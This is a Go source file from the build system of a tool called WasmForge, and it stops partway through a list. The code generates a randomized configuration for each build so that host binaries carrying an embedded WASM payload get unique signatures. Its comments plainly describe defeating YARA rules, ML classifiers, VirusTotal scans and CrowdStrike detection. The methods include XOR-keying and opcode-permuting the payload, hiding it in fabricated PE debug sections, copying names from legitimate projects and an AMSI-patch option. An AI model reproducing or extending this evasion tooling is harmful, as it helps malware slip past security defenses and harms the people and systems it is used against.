package build

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"os"
	"sort"
	"strings"
)

// polyConfig holds all randomized build configuration that makes each
// compiled host binary structurally unique. Every build generates fresh
// identifiers, package paths, variable names, and code structure so that
// no two binaries share the same static signature.
type polyConfig struct {
	// Module and package layout.
	ModuleName  string // go.mod module name (e.g., "svcutil")
	HostmodPath string // package path relative to module (e.g., "pkg/transport")
	RuntimePath string // package path relative to module (e.g., "internal/engine")
	NamesPath   string // package path relative to module (e.g., "pkg/catalog")
	HostmodPkg  string // Go package name (last segment, e.g., "transport")
	RuntimePkg  string // Go package name (e.g., "engine")
	NamesPkg    string // Go package name (e.g., "catalog")

	// Embed configuration.
	EmbedFile string // embedded data filename (e.g., "resource.dat")

	// Variable names in generated main.go.
	EmbedVar   string // //go:embed variable (e.g., "moduleData")
	DecodedVar string // decoded data (e.g., "content")
	KeyVar     string // decode key (e.g., "checksum")
	ConfigVar  string // runtime config (e.g., "settings")
	SizeVar    string // data length (e.g., "dataLen")

	// Identifier scrubbing (applied to copied package source).
	UpperIdent string // replaces "WASMFORGE" (e.g., "SVCRT")
	LowerIdent string // replaces "wasmforge" (e.g., "svcrt")

	// Config struct field name replacements.
	FieldPayload    string // replaces "WASMData"
	FieldRawNet     string // replaces "RawSockets"
	FieldSysAPIs    string // replaces "Win32APIs"
	FieldDarwinAPIs  string // replaces "DarwinAPIs"
	FieldMounts      string // replaces "FSMounts"
	FieldNoAMSIPatch string // replaces "NoAMSIPatch"

	// Mirror table identifier replacements (kills YARA string-based rules).
	MirrorWritable string // replaces "MirrorWritable"
	MirrorRefresh  string // replaces "RefreshWritableMirrors"
	MirrorSync     string // replaces "SyncWritableMirrors"
	MirrorScan     string // replaces "ScanAndMirrorPointers"
	MirrorPopulate string // replaces "populateMirror"
	MirrorTable    string // replaces "MirrorTable"

	// Distinctive hostmod method/function names — static OPSEC-safe renames.
	// These are the same every build (no per-build randomization) so they
	// look like natural Go identifiers to ML classifiers.
	MethodHandleFault         string
	MethodLookupByWasm        string
	MethodLookupByHost        string
	MethodLookupPendingByWasm string
	MethodStoreTruncatedProc  string
	MethodLookupTruncatedProc string
	MethodRegisterPending     string
	MethodResolvePendingEager string
	MethodDeepMirrorPatch     string
	MethodSynthResolvConf     string
	MethodGetWindowsDNS       string
	MethodCompactTokenInfo    string
	MethodSyncToHost          string

	// Code structure variation.
	DecodeVariant int // which decode stub variant to emit (0-4)

	// Custom WASM opcode permutation — per-build virtual machine.
	// OpcodePermutation is a bijective mapping of all 256 byte values
	// used to remap opcode bytes in WASM function bodies.
	OpcodePermutation [256]byte

	// SectionIDMap maps the 13 standard WASM section IDs (0x00-0x0C)
	// to random byte values that preserve relative ordering.
	SectionIDMap [13]byte

	// CustomMagic replaces the standard WASM magic bytes (\0asm).
	CustomMagic [4]byte

	// PayloadKey is a per-build 32-byte XOR key applied to the entire WASM
	// payload after opcode remapping. XOR rotation (data[i] ^= key[i%32])
	// compiles to a simple MOVZX+XOR — an extremely common Go pattern that
	// blends with crypto/encoding code and avoids the distinctive
	// MOVZX→LEAQ→MOVZX instruction sequence of lookup-table decoding.
	PayloadKey [32]byte

	// KeyVar is the variable name for the 32-byte XOR key in generated code.
	// (Replaces the old 256-byte lookup table variable.)
	PayloadKeyVar string

	// PE payload section loading (Windows-only alternative to //go:embed).
	// When PEPayload is true, the WASM payload is zlib-compressed and injected
	// as a PE section post-build instead of using //go:embed (which bloats .rdata).
	PEPayload         bool   // true when payload is in PE section instead of //go:embed
	PayloadSection    string // PE section name (e.g., ".zdebug_ranges")
	PayloadMarker     uint32 // Random marker prepended to payload for runtime lookup
	LoaderFunc        string // function name for PE section loader
	LoaderDistFunc    string // name for tryDistributed helper
	LoaderSingleFunc  string // name for trySingle helper
	LoaderDecompFunc  string // name for zlibDecompress helper

	// Wazero type name replacements — kills gopclntab method signatures that
	// YARA rules use to detect WasmForge (e.g., "(*hostFunctionBuilder).Export").
	// Only unexported types + the CompilationCache export need renaming.
	WazeroTypeRenames []stringPair

	// WASINameMap maps original WASI function names to per-build random names.
	// Applied to both the WASM import section and the wazero fork source.
	WASINameMap map[string]string

	// PE loader obfuscation — per-build prefix initialization and
	// LoaderVariant selects between structurally different implementations.
	PrefixVar     string // per-build random variable name for the ".zd" prefix string
	LoaderVariant int    // 0-2: structural variant of PE loader function

	// ChunkPayload mode (WASMFORGE_CHUNK_PAYLOAD=1): payload is split across
	// 6 PE sections with an in-binary manifest. The runtime loader scans
	// .rdata for the manifest magic (0x57464348) to locate chunk records.
	ChunkPayload bool // true when chunked distribution is used

	// ExportNameMap maps each anonymized host export name (the VALUES in
	// internal/names/names.go) to a per-build random replacement. Applied
	// to both the WASM import section and the copied names.go so the guest
	// binary and host binary use the same random names.
	// Example: "fd_read2" → "a7_bx3", "sys_hostname" → "q2_nf9"
	ExportNameMap map[string]string

	// Ghost is the loaded ghost profile for this build (may be nil when no
	// profiles are embedded). When non-nil, authentic names from the profiled
	// binary replace word-list names in gopclntab-visible positions.
	Ghost *GhostProfile

	// DeadCodePkgs maps relative package path → Go source for dead code
	// packages (e.g., "internal/telemetry" → "<source>"). Populated once in
	// newPolyConfig so that both the main.go import list and the embedder's
	// file generation use exactly the same package paths.
	DeadCodePkgs map[string]string
}

// stringPair is an ordered old→new replacement.
type stringPair struct {
	old string
	new string
}

// ──────────────────────────────────────────────────────────────────────
// Name pools — drawn from real package names used by top Go projects
// (kubernetes, terraform, docker, grafana, prometheus, etcd, consul,
// istio, containerd, cockroachdb, traefik, vault). Any YARA rule
// targeting these names would false-positive on legitimate software.
// ──────────────────────────────────────────────────────────────────────

var moduleNames = []string{
	// Patterns from real Go CLIs and services (kubectl, kubelet, consul,
	// traefik, caddy, grafana-agent, etc.).
	"svcutil", "netmon", "hostctl", "agentctl", "taskhost",
	"procmgr", "logutil", "cfgutil", "authctl", "connmgr",
	"configsvc", "netproxy", "taskrunner", "dataloader", "nodectl",
	"eventmgr", "workerctl", "healthmon", "configd", "collectord",
	"exporterd", "watcherd", "resolverd", "routerctl", "cachesvc",
	"storesvc", "queuemgr", "schedulerd", "registryd", "dispatchd",
}

// infraPkgNames — for the host module (networking/infrastructure).
// From: k8s/pkg/{proxy,client,controller}, terraform/internal/{backend,
// providers,httpclient}, docker/pkg/{plugins,process}, traefik/pkg/
// {provider,proxy,middleware}, istio/pkg/{proxy,network,security},
// grafana/pkg/{server,middleware,services}.
var infraPkgNames = []string{
	"transport", "provider", "handler", "backend", "service",
	"dispatcher", "broker", "gateway", "proxy", "pipeline",
	"client", "server", "middleware", "controller", "dialer",
	"router", "resources", "grpc", "rpc", "network",
}

// enginePkgNames — for the runtime engine (execution/orchestration).
// From: etcd/pkg/{runtime,schedule}, containerd/pkg/{shim,gc,progress},
// k8s/pkg/{scheduler,controller}, cockroach/pkg/{jobs,workload},
// grafana/pkg/{bus,infra,modules}.
var enginePkgNames = []string{
	"engine", "core", "runner", "executor", "loader",
	"bootstrap", "driver", "monitor", "scheduler", "runtime",
	"process", "command", "worker", "observer", "indexer",
}

// catalogPkgNames — for the names/config mapping package.
// From: terraform/internal/{configs,states,registry}, grafana/pkg/
// {models,kinds,setting,storage}, prometheus/model/{labels,metadata},
// cockroach/pkg/{config,settings,storage,keys}, istio/pkg/{config,
// model,labels}.
var catalogPkgNames = []string{
	"config", "schema", "registry", "metadata", "models",
	"types", "configs", "settings", "states", "storage",
	"labels", "kinds", "mapping", "manifest", "spec",
}

var payloadKeyVarNames = []string{
	"sessionKey", "syncToken", "authNonce", "hmacSeed", "cipherKey",
	"blockKey", "frameKey", "hashSeed", "checkKey", "tagKey",
}

// payloadSectionNames lists fabricated DWARF-like debug section names.
// These names don't correspond to real Go DWARF sections, so the payload
// is ADDED as a new section rather than replacing existing debug data.
// This avoids corrupting real DWARF info which can trigger heuristic
// payloadDistributionTargets lists the debug sections to distribute the
// payload across, with target ratios based on legitimate Go binaries.
// The payload is split proportionally and appended to each existing section,
// maintaining natural size relationships between debug sections.
//
// Target ratios (averaged from real Go binaries):
//   .zdebug_info     40.4%
//   .zdebug_line     23.4%
//   .zdebug_loclists 20.8%
//   .zdebug_rnglists  9.8%
//   .zdebug_frame     4.8%
//   .zdebug_addr      0.6%
//   .zdebug_abbrev    0.1%
var payloadDistributionRatios = map[string]float64{
	".zdebug_info":     40.4,
	".zdebug_line":     23.4,
	".zdebug_loclists": 20.8,
	".zdebug_rnglists": 9.8,
	".zdebug_frame":    4.8,
	".zdebug_addr":     0.6,
	".zdebug_abbrev":   0.1,
	// Modern Go (1.20+) uses uncompressed .debug_* names without the 'z'.
	".debug_info":     40.4,
	".debug_line":     23.4,
	".debug_loclists": 20.8,
	".debug_rnglists": 9.8,
	".debug_frame":    4.8,
	".debug_addr":     0.6,
	".debug_abbrev":   0.1,
}

// Fallback: if distributed injection fails, use a single section with
// a legitimate DWARF name.
var payloadSectionNames = []string{
	".zdebug_ranges",
	".zdebug_types",
	".zdebug_pubnames",
	".zdebug_pubtypes",
	".zdebug_macro",
}

var loaderFuncNames = []string{
	"loadData", "initModule", "readPayload", "getResource",
	"fetchContent", "loadContent", "readModule", "getBundle",
}
var loaderDistFuncNames = []string{
	"scanSegments", "readChunked", "collectParts", "gatherBlocks",
	"assemblePages", "mergeRegions", "extractChains", "joinFragments",
}
var loaderSingleFuncNames = []string{
	"readSection", "loadBlock", "extractRegion", "fetchSegment",
	"parseChunk", "getSectionData", "readBlob", "loadFragment",
}
var loaderDecompFuncNames = []string{
	"inflate", "unpack", "decompress", "expand",
	"decode", "restore", "extract", "unwrap",
}

// Wazero type name randomization — uses wordList to generate natural-sounding
// identifiers per build instead of picking from a static pool. This prevents
// YARA rules from matching a fixed set of replacement names.

var pathPrefixes = []string{"pkg", "internal", "lib"}

var embedFileNames = []string{
	"resource.dat", "module.dat", "content.dat", "package.dat",
	"data.bin", "module.bin", "payload.bin", "image.bin",
	"bundle.dat", "archive.dat", "asset.bin", "blob.dat",
}

var embedVarNames = []string{
	"moduleData", "pluginData", "configData", "resourceData",
	"assetData", "binaryData", "contentData", "packageData",
	"bundleData", "archiveData", "payloadData", "imageData",
}

var decodedVarNames = []string{
	"content", "module", "resource", "payload", "binary",
	"program", "image", "bundle", "archive", "plugin",
}

var keyVarNames = []string{
	"checksum", "digest", "signature", "hash", "token",
	"nonce", "salt", "seed", "tag", "mac",
}

var configVarNames = []string{
	"settings", "options", "params", "runCfg", "appCfg",
	"launchCfg", "execCfg", "hostCfg", "procCfg", "taskCfg",
}

var sizeVarNames = []string{
	"n", "sz", "dataLen", "size", "length", "total", "count",
}

var upperIdents = []string{
	"SVCRT", "NETRT", "APPRT", "HOSTRT", "AGRT",
	"PROCRT", "TASKRT", "NODERT", "CORERT", "EXECRT",
}

var payloadFieldNames = []string{
	"Payload", "Content", "ModuleBytes", "BinData", "Resource", "Program",
}
var rawNetFieldNames = []string{
	"RawNet", "DirectNet", "HostNet", "NativeNet", "LowLevelNet",
}
var sysAPIFieldNames = []string{
	"NativeAPIs", "HostAPIs", "SysAPIs", "PlatformAPIs", "SystemAPIs",
}
var darwinAPIFieldNames = []string{
	"FrameworkAPIs", "DarwinSys", "MacAPIs", "FWBridge", "NativeFW",
}
var mountFieldNames = []string{
	"DirMounts", "VolumePaths", "MountDirs", "HostDirs", "FSDirs",
}
var noAMSIPatchFieldNames = []string{
	"SkipScanPatch", "DisableHook", "BypassDisabled", "NoScanFix", "RawMode",
}

// Mirror table identifier pools — generic names that blend into any Go codebase.
var mirrorWritableNames = []string{
	"CacheWritable", "EntryWritable", "IndexWritable", "SlotWritable", "NodeWritable",
}
var mirrorRefreshNames = []string{
	"RefreshWritableCache", "RefreshWritableEntries", "RefreshWritableSlots", "RefreshWritableNodes", "RefreshWritableIndex",
}
var mirrorSyncNames = []string{
	"SyncWritableCache", "SyncWritableEntries", "SyncWritableSlots", "SyncWritableNodes", "SyncWritableIndex",
}
var mirrorScanNames = []string{
	"ScanAndUpdateEntries", "ScanAndRefreshCache", "ScanAndPopulateIndex", "ScanAndBuildTable", "ScanAndResolveSlots",
}
var mirrorPopulateNames = []string{
	"populateEntry", "populateCache", "populateIndex", "populateSlot", "populateNode",
}
var mirrorTableNames = []string{
	"EntryTable", "CacheTable", "IndexTable", "SlotTable", "NodeTable",
}

// ──────────────────────────────────────────────────────────────────────
// Constructor
// ──────────────────────────────────────────────────────────────────────

func newPolyConfig(ghostName string) (*polyConfig, error) {
	pc := &polyConfig{}
	var err error

	// Load ghost profile for authentic name generation.
	var ghost *GhostProfile
	if ghostName != "" {
		var loadErr error
		ghost, loadErr = LoadGhostProfile(ghostName)
		if loadErr != nil {
			return nil, fmt.Errorf("loading ghost profile %q: %w", ghostName, loadErr)
		}
	} else {
		// Try to load a random profile; fall back to nil (uses existing pools).
		ghost, _ = LoadRandomGhostProfile()
	}
	pc.Ghost = ghost

	if ghost != nil {
		pc.ModuleName = ghost.ModuleName()
	} else {
		pc.ModuleName, err = randChoice(moduleNames)
		if err != nil {
			return nil, err
		}
	}

	// Pick unique package names for each of the three internal packages.
	// allPkgUsed is a shared map used across ALL ghost package segment picks
	// (HostmodPkg, RuntimePkg, NamesPkg, wazero pkgSet, dead-code packages)
	// to guarantee no two subsystems receive the same package name.
	var allPkgUsed map[string]bool
	if ghost != nil {
		allPkgUsed = make(map[string]bool)
		pc.HostmodPkg = ghost.PackageSegment("infra", allPkgUsed)
		pc.RuntimePkg = ghost.PackageSegment("engine", allPkgUsed)
		pc.NamesPkg = ghost.PackageSegment("catalog", allPkgUsed)
		// VT testing (2026-06-11): override pkg names via env vars for
		// CS-clean-name testing. When fixed across a batch, removes the
		// per-build variance that allowed CrowdStrike Falcon hits.
		if fixed := os.Getenv("WASMFORGE_FIXED_RUNTIME_PKG"); fixed != "" {
			pc.RuntimePkg = fixed
			allPkgUsed[fixed] = true
		}
		if fixed := os.Getenv("WASMFORGE_FIXED_HOSTMOD_PKG"); fixed != "" {
			pc.HostmodPkg = fixed
			allPkgUsed[fixed] = true
		}
		if fixed := os.Getenv("WASMFORGE_FIXED_NAMES_PKG"); fixed != "" {
			pc.NamesPkg = fixed
			allPkgUsed[fixed] = true
		}
	} else {
		pc.HostmodPkg, err = randChoice(infraPkgNames)
		if err != nil {
			return nil, err
		}
		pc.RuntimePkg, err = randChoiceExcluding(enginePkgNames, pc.HostmodPkg)
		if err != nil {
			return nil, err
		}
		pc.NamesPkg, err = randChoiceExcluding(catalogPkgNames, pc.HostmodPkg, pc.RuntimePkg)
		if err != nil {
			return nil, err
		}
	}

	// Random path prefix (pkg/, internal/, lib/).
	prefix, err := randChoice(pathPrefixes)
	if err != nil {
		return nil, err
	}
	pc.HostmodPath = prefix + "/" + pc.HostmodPkg
	pc.RuntimePath = prefix + "/" + pc.RuntimePkg
	pc.NamesPath = prefix + "/" + pc.NamesPkg

	// Embed file and variable names.
	pc.EmbedFile, err = randChoice(embedFileNames)
	if err != nil {
		return nil, err
	}
	pc.EmbedVar, err = randChoice(embedVarNames)
	if err != nil {
		return nil, err
	}
	pc.DecodedVar, err = randChoice(decodedVarNames)
	if err != nil {
		return nil, err
	}
	pc.KeyVar, err = randChoice(keyVarNames)
	if err != nil {
		return nil, err
	}
	pc.ConfigVar, err = randChoice(configVarNames)
	if err != nil {
		return nil, err
	}
	pc.SizeVar, err = randChoice(sizeVarNames)
	if err != nil {
		return nil, err
	}

	// Identifier scrubbing.
	pc.UpperIdent, err = randChoice(upperIdents)
	if err != nil {
		return nil, err
	}
	pc.LowerIdent = strings.ToLower(pc.UpperIdent)

	// Config field names.
	pc.FieldPayload, err = randChoice(payloadFieldNames)
	if err != nil {
		return nil, err
	}
	pc.FieldRawNet, err = randChoice(rawNetFieldNames)
	if err != nil {
		return nil, err
	}
	pc.FieldSysAPIs, err = randChoice(sysAPIFieldNames)
	if err != nil {
		return nil, err
	}
	pc.FieldDarwinAPIs, err = randChoice(darwinAPIFieldNames)
	if err != nil {
		return nil, err
	}
	pc.FieldMounts, err = randChoice(mountFieldNames)
	if err != nil {
		return nil, err
	}
	pc.FieldNoAMSIPatch, err = randChoice(noAMSIPatchFieldNames)
	if err != nil {
		return nil, err
	}

	// Mirror table identifiers (breaks YARA string-based detection).
	pc.MirrorWritable, err = randChoice(mirrorWritableNames)
	if err != nil {
		return nil, err
	}
	pc.MirrorRefresh, err = randChoice(mirrorRefreshNames)
	if err != nil {
		return nil, err
	}
	pc.MirrorSync, err = randChoice(mirrorSyncNames)
	if err != nil {
		return nil, err
	}
	pc.MirrorScan, err = randChoice(mirrorScanNames)
	if err != nil {
		return nil, err
	}
	pc.MirrorPopulate, err = randChoice(mirrorPopulateNames)
	if err != nil {
		return nil, err
	}
	pc.MirrorTable, err = randChoice(mirrorTableNames)
	if err != nil {
		return nil, err
	}

	// Decode variant (0-4). Can be forced via WASMFORGE_VARIANT for testing.
	if v := os.Getenv("WASMFORGE_VARIANT"); v != "" {
		fmt.Sscanf(v, "%d", &pc.DecodeVariant)
	} else {
		pc.DecodeVariant, err = randInt(5)
		if err != nil {
			return nil, err
		}
	}

	// Custom WASM opcode permutation — per-build virtual machine.
	// Fisher-Yates shuffle of all 256 byte values produces a bijective mapping.
	for i := range pc.OpcodePermutation {
		pc.OpcodePermutation[i] = byte(i)
	}
	for i := 255; i > 0; i-- {
		j, err := randInt(i + 1)
		if err != nil {
			return nil, err
		}
		pc.OpcodePermutation[i], pc.OpcodePermutation[j] = pc.OpcodePermutation[j], pc.OpcodePermutation[i]
	}
	fixOpcodeCollisions(&pc.OpcodePermutation)

	// Order-preserving section ID permutation: pick 13 distinct random
	// byte values, then sort so relative ordering is maintained. This
	// ensures checkSectionOrder() comparisons still work in wazero.
	used := make(map[byte]bool, 13)
	for i := 0; i < 13; {
		b := make([]byte, 1)
		if _, err := rand.Read(b); err != nil {
			return nil, fmt.Errorf("crypto/rand: %w", err)
		}
		if !used[b[0]] {
			pc.SectionIDMap[i] = b[0]
			used[b[0]] = true
			i++
		}
	}
	sort.Slice(pc.SectionIDMap[:], func(i, j int) bool {
		return pc.SectionIDMap[i] < pc.SectionIDMap[j]
	})

	// Custom magic bytes (replaces standard \0asm).
	if _, err := rand.Read(pc.CustomMagic[:]); err != nil {
		return nil, fmt.Errorf("crypto/rand: %w", err)
	}

	// Per-build 32-byte rotating XOR key for payload encoding.
	// Applied AFTER opcode remapping. XOR rotation compiles to simple
	// MOVZX+XOR instructions — a common Go pattern that blends with
	// crypto/encoding code.
	if _, err := rand.Read(pc.PayloadKey[:]); err != nil {
		return nil, fmt.Errorf("crypto/rand: %w", err)
	}

	pc.PayloadKeyVar, err = randChoice(payloadKeyVarNames)
	if err != nil {
		return nil, err
	}

	// PE payload section names — always initialized, only used when PEPayload is true.
	pc.PayloadSection, err = randChoice(payloadSectionNames)
	if err != nil {
		return nil, err
	}
	// Random 4-byte marker for payload section identification at runtime.
	var markerBytes [4]byte
	rand.Read(markerBytes[:])
	pc.PayloadMarker = uint32(markerBytes[0]) | uint32(markerBytes[1])<<8 |
		uint32(markerBytes[2])<<16 | uint32(markerBytes[3])<<24

	pc.LoaderFunc, err = randChoice(loaderFuncNames)
	if err != nil {
		return nil, err
	}
	pc.LoaderDistFunc, err = randChoice(loaderDistFuncNames)
	if err != nil {
		return nil, err
	}
	pc.LoaderSingleFunc, err = randChoice(loaderSingleFuncNames)
	if err != nil {
		return nil, err
	}
	pc.LoaderDecompFunc, err = randChoice(loaderDecompFuncNames)
	if err != nil {
		return nil, err
	}

	// Per-build wordList — only used for export names and WASI function names.
	// Function/method/type renames use STATIC values to preserve recognizable
	// Go patterns in gopclntab (ML classifiers flag random verb+noun combos).
	wl := newWordList()
	wlUsed := make(map[string]bool)

	// PE loader obfuscation — prefix variable for section name check.
	if ghost != nil {
		pc.PrefixVar = ghost.FunctionName(wlUsed)
	} else {
		pc.PrefixVar = wl.generate(wlUsed)
	}

	// Distinctive hostmod method/function name renames.
	// When a ghost profile is available, use authentic names from the profiled
	// binary so gopclntab shows real-looking identifiers from a known project.
	// When no ghost is available, fall back to static OPSEC-safe renames.
	if ghost != nil {
		pc.MethodHandleFault = ghost.ExportedName(wlUsed)
		pc.MethodLookupByWasm = ghost.ExportedName(wlUsed)
		pc.MethodLookupByHost = ghost.ExportedName(wlUsed)
		pc.MethodLookupPendingByWasm = ghost.ExportedName(wlUsed)
		pc.MethodStoreTruncatedProc = ghost.ExportedName(wlUsed)
		pc.MethodLookupTruncatedProc = ghost.ExportedName(wlUsed)
		pc.MethodRegisterPending = ghost.ExportedName(wlUsed)
		pc.MethodResolvePendingEager = ghost.ExportedName(wlUsed)
		pc.MethodDeepMirrorPatch = ghost.FunctionName(wlUsed)
		pc.MethodSynthResolvConf = ghost.FunctionName(wlUsed)
		pc.MethodGetWindowsDNS = ghost.FunctionName(wlUsed)
		pc.MethodCompactTokenInfo = ghost.FunctionName(wlUsed)
		pc.MethodSyncToHost = ghost.ExportedName(wlUsed)
	} else {
		pc.MethodHandleFault = "RecoverFault"
		pc.MethodLookupByWasm = "LookupByAddr"
		pc.MethodLookupByHost = "LookupByHost"
		pc.MethodLookupPendingByWasm = "LookupPendingByAddr"
		pc.MethodStoreTruncatedProc = "StoreTruncatedProc"
		pc.MethodLookupTruncatedProc = "LookupTruncatedProc"
		pc.MethodRegisterPending = "RegisterPending"
		pc.MethodResolvePendingEager = "ResolvePendingEager"
		pc.MethodDeepMirrorPatch = "deepMirrorPatch"
		pc.MethodSynthResolvConf = "synthResolvConf"
		pc.MethodGetWindowsDNS = "getWindowsDNS"
		pc.MethodCompactTokenInfo = "compactTokenInfo"
		pc.MethodSyncToHost = "SyncToHost"
	}

	pc.LoaderVariant, err = randInt(3)
	if err != nil {
		return nil, err
	}

	// Wazero identity scrubbing — replacements for "wazero"/"wasm"/"wasi"
	// literals that directly identify the technology.
	// When a ghost profile is available, use authentic function/export names from
	// the profiled binary so gopclntab shows identifiers from a known project.
	// Otherwise fall back to static OPSEC-safe values.
	var hfb, mc, rt, cc, wot, wo, gv, wv, ec string
	if ghost != nil {
		hfb = ghost.FunctionName(wlUsed)
		mc = ghost.FunctionName(wlUsed)
		rt = ghost.FunctionName(wlUsed)
		cc = ghost.ExportedName(wlUsed)
		wot = ghost.ExportedName(wlUsed)
		wo = ghost.ExportedName(wlUsed)
		gv = ghost.ExportedName(wlUsed)
		wv = ghost.FunctionName(wlUsed)
		ec = ghost.FunctionName(wlUsed)
	} else {
		hfb = "handlerFactory"
		mc = "instanceConfig"
		rt = "lifecycle"
		cc = "ObjectCache"
		wot = "InternalType"  // replaces WazeroOnlyType
		wo = "InternalOnly"   // replaces WazeroOnly
		gv = "GetVersion"     // replaces GetWazeroVersion
		wv = "version"        // replaces wazeroVersion
		ec = "engine"         // replaces "wazero" in error/cache strings
	}
	// Wazero engine sub-package renames — use realistic compiler/engine names.
	realisticEnginePkgs := [][2]string{
		{"engineapi", "codegen"},
		{"backendapi", "compiler"},
		{"targetapi", "emitter"},
		{"machineapi", "lowering"},
	}
	engIdx, _ := randInt(len(realisticEnginePkgs))
	wvapi := realisticEnginePkgs[engIdx][0]
	wve := realisticEnginePkgs[engIdx][1]

	// Sub-package directory + package renames — kills wasm/wasi/ssa from gopclntab.
	// When a ghost profile is available, use authentic package names from the
	// profiled binary. Otherwise use realistic names from popular Go projects.
	var pkgSet []string
	if ghost != nil {
		// Use allPkgUsed so wazero package names don't collide with
		// HostmodPkg/RuntimePkg/NamesPkg selected above.
		pkgSet = ghost.PackagePoolWithUsed(13, allPkgUsed)
	} else {
		// Names sourced from: grpc, prometheus, kubernetes, terraform, etcd, consul,
		// docker, containerd, grafana, istio, vault, nomad.
		realisticPkgNames := [][]string{
			// [wasi_snapshot_preview1, assemblyscript, wasmruntime, wasmdebug, internalapi,
			//  interpreter, emscripten, filecache, ieee754, leb128, wasip1, wasm, ssa]
			{"syscall_linux", "bindings", "runtimeutil", "debugutil", "coreapi",
				"evaluator", "compat", "diskcache", "floatutil", "varint", "posixfs", "types", "optimizer"},
			{"platform_unix", "interop", "procutil", "traceutil", "pluginapi",
				"resolver", "bridge", "localcache", "numeric", "encoding", "unixfs", "schema", "planner"},
			{"os_support", "extensions", "executil", "logutil", "internalutil",
				"dispatcher", "adapter", "blobcache", "mathutil", "compress", "hostfs", "model", "analyzer"},
			{"sys_posix", "foreign", "taskutil", "errorutil", "privateapi",
				"processor", "wrapper", "storecache", "bitutil", "codec", "vfs", "descriptor", "transform"},
		}
		pkgIdx, _ := randInt(len(realisticPkgNames))
		pkgSet = realisticPkgNames[pkgIdx]
	}
	pkgWasiSnap := pkgSet[0]
	pkgAsmScript := pkgSet[1]
	pkgWasmRT := pkgSet[2]
	pkgWasmDbg := pkgSet[3]
	pkgIntAPI := pkgSet[4]
	pkgInterp := pkgSet[5]
	pkgEmsc := pkgSet[6]
	pkgFCache := pkgSet[7]
	pkgIEEE := pkgSet[8]
	pkgLEB := pkgSet[9]
	pkgWasip1 := pkgSet[10]
	pkgWasm := pkgSet[11]
	pkgSSA := pkgSet[12]

	// Debug: print the pkgSet to stderr so we can trace duplicate names.
	if os.Getenv("WASMFORGE_DEBUG_PKGS") != "" {
		fmt.Fprintf(os.Stderr, "DEBUG pkgSet: snap=%s asmscript=%s wasmrt=%s wasmdbg=%s intapi=%s interp=%s emsc=%s fcache=%s ieee=%s leb=%s wasip1=%s wasm=%s ssa=%s\n",
			pkgWasiSnap, pkgAsmScript, pkgWasmRT, pkgWasmDbg, pkgIntAPI, pkgInterp, pkgEmsc, pkgFCache, pkgIEEE, pkgLEB, pkgWasip1, pkgWasm, pkgSSA)
		fmt.Fprintf(os.Stderr, "DEBUG allPkgUsed: %v\n", allPkgUsed)
	}

	// Pre-generate dead code packages once so both the main.go import list and
	// the embedder file generation use the exact same package paths/sources.
	// This is done AFTER selecting wazero/hostmod/runtime/names packages so
	// allPkgUsed is fully populated, preventing dead-code package names from
	// colliding with any wazero sub-package rename destination.
	if ghost != nil {
		pc.DeadCodePkgs = ghost.DeadCodePackages(8, 30, allPkgUsed) // 8 packages, 30 funcs each
	} else {
		pc.DeadCodePkgs = deadCodePackages
	}

	// WAZEVO cache magic: 6 random uppercase ASCII letters.
	var magicBytes [6]byte
	for i := range magicBytes {
		magicBytes[i] = byte('A') + byte(cryptoRandN(26))
	}

	// WazeroTypeRenames — ONLY renames that scrub "wazero"/"wasm"/"wasi" literals.
	// All other wazero internal names (ModuleInstance, CompilationCache, TypeSection,
	// V128Shuffle, passCalculateImmediateDominators, etc.) are PRESERVED to maintain
	// recognizable Go patterns in gopclntab. ML classifiers associate these natural
	// function name distributions with legitimate software.
	//
	// v0.3.5 (84% VT clean) had ZERO wordlist-generated renames. Current random
	// verb+noun names (parseBuffer, syncRegistry) dropped clean rate to 42%.
	pc.WazeroTypeRenames = []stringPair{
		// ── Wazero identity scrubbing (OPSEC-critical) ──
		// Exported names first (longer, prevent partial matches).
		{"NewCompilationCache", "New" + cc},
		{"CompilationCache", cc},
		// Kill remaining "wazero" strings in gopclntab, error messages, cache paths.
		{"GetWazeroVersion", "Get" + gv},
		{"WazeroOnlyType", wot},
		{"WazeroOnly", wo},
		{"wazeroOnlyType", strings.ToLower(wot[:1]) + wot[1:]},
		{"wazeroOnly", strings.ToLower(wo[:1]) + wo[1:]},
		{"wazeroVersion", wv},
		// Error message and cache path strings.
		{"recovered by wazero", "recovered by " + ec},
		{"a bug in wazero", "a bug in " + ec},
		{`"wazero-"`, `"` + ec + `-"`},
		{"wasm stack trace", ec + " stack trace"},
		{"wasm binary offset", ec + " binary offset"},

		// ── Package path renames (kills wasm/wasi/ssa from gopclntab paths) ──
		{"%%PROTECT_STR%%wasi_snapshot_preview1", pkgWasiSnap},
		{`const ModuleName = `, `var ModuleName = `},
		{`switch fnd.ModuleName() {
	case wasip1.InternalModuleName:`,
			`if fnd.ModuleName() == wasip1.InternalModuleName {`},
		{"\tcase \"env\":", "\t} else if fnd.ModuleName() == \"env\" {"},
		{"\tdefault:\n\t\t// We don't know the scope", "\t} else {\n\t\t// We don't know the scope"},
		{"assemblyscript", pkgAsmScript},         // 14 chars
		{"wazevoapi", wvapi},                     // 9 chars — before wazevo
		{"wasmruntime", pkgWasmRT},               // 11 chars — before wasm
		{"internalapi", pkgIntAPI},               // 11 chars
		{"interpreter", pkgInterp},               // 11 chars
		{"emscripten", pkgEmsc},                  // 10 chars
		{"wasmdebug", pkgWasmDbg},                // 9 chars — before wasm
		{"filecache", pkgFCache},                 // 9 chars
		{"regalloc", "allocator"},                // 8 chars — realistic name
		{"ieee754", pkgIEEE},                     // 7 chars
		{"leb128", pkgLEB},                       // 6 chars
		{"wasip1", pkgWasip1},                    // 6 chars — after wasi_snapshot_preview1
		{"fsapi", "ioutil"},                      // 5 chars — realistic stdlib name
		{"sysfs", "osutil"},                      // 5 chars — realistic stdlib name
		{"wazevo", wve},                          // 6 chars
		// WAZEVO cache magic bytes.
		{"'W', 'A', 'Z', 'E', 'V', 'O'", fmt.Sprintf("'%c', '%c', '%c', '%c', '%c', '%c'",
			magicBytes[0], magicBytes[1], magicBytes[2], magicBytes[3], magicBytes[4], magicBytes[5])},
		// Short package names — context-aware regex replacement.
		{"%%SHORT%%wasm", pkgWasm},   // 4 chars — most generic, must come last
		{"%%SHORT%%ssa", pkgSSA},     // 3 chars — highest collision risk

		// ── Wasm/wasi-prefixed identifiers → STATIC realistic renames ──
		// These scrub the "Wasm"/"wasi" prefix that identifies the technology
		// while keeping recognizable Go type/function patterns.
		// Exported (capital Wasm → Module prefix):
		{"%%FORK_ONLY%%WasmCompat", "ModuleCompat"},
		{"%%FORK_ONLY%%WasmFunctionType", "HandlerSignature"},
